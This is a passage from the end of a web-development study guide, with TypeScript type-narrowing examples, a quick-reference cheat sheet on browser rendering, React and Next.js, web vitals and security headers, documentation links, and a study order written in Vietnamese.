// ── TYPE NARROWING ──
function processInput(input: string | number | null) {
    if (input === null) {
        // TypeScript knows: input is null here
        return
    }
    if (typeof input === 'string') {
        // TypeScript knows: input is string here
        return input.toUpperCase()
    }
    // TypeScript knows: input is number here
    return input.toFixed(2)
}

// Discriminated unions:
type Shape =
    | { kind: 'circle'; radius: number }
    | { kind: 'rectangle'; width: number; height: number }
    | { kind: 'triangle'; base: number; height: number }

function area(shape: Shape): number {
    switch (shape.kind) {
        case 'circle':     return Math.PI * shape.radius ** 2
        case 'rectangle':  return shape.width * shape.height
        case 'triangle':   return 0.5 * shape.base * shape.height
        default:
            const _exhaustive: never = shape  // compile error if case missed!
            return _exhaustive
    }
}
```

---

## 📎 Quick Reference

```
Browser render path:     HTML → DOM + CSS → CSSOM → Render Tree → Layout → Paint → Composite
Script loading:          defer (ordered, after DOM) > async (unordered, ASAP) > default (blocking)
Event phases:            Capture (top→target) → Target → Bubble (target→top)
React rendering:         State change → New VDOM → Diff (reconciliation) → Commit DOM changes
React hooks order:       useState → useEffect → useCallback → useMemo (never in conditions/loops!)
Next.js rendering:       SSG (build) → ISR (build+revalidate) → SSR (per-request) → CSR (browser)
Core Web Vitals:         LCP < 2.5s | INP < 200ms | CLS < 0.1
Security headers:        CSP + HSTS + X-Frame-Options + X-Content-Type-Options
Cache-Control:           immutable (static w/hash) | no-store (sensitive) | max-age + stale-while-revalidate
```

## 📎 Official Documentation Links

| Topic | Link |
|-------|------|
| MDN Web Docs | <https://developer.mozilla.org/en-US/> |
| React Docs | <https://react.dev/> |
| Next.js Docs | <https://nextjs.org/docs> |
| TypeScript Handbook | <https://www.typescriptlang.org/docs/> |
| Google Web Dev | <https://web.dev/> |
| PageSpeed Insights | <https://pagespeed.web.dev/> |
| HTML Living Standard | <https://html.spec.whatwg.org/> |
| CSS Tricks | <https://css-tricks.com/> |
| Can I Use | <https://caniuse.com/> |
| Google Search Central | <https://developers.google.com/search/docs> |
| Web Vitals | <https://web.dev/vitals/> |
| Schema.org | <https://schema.org/> |
| Lighthouse | <https://developer.chrome.com/docs/lighthouse/> |
| V8 Blog | <https://v8.dev/blog> |
| WHATWG Streams | <https://streams.spec.whatwg.org/> |

---

*Học theo thứ tự: Browser internals → DOM → Events → JavaScript Event Loop → React Hooks → Next.js Rendering → SEO → Performance → Security*
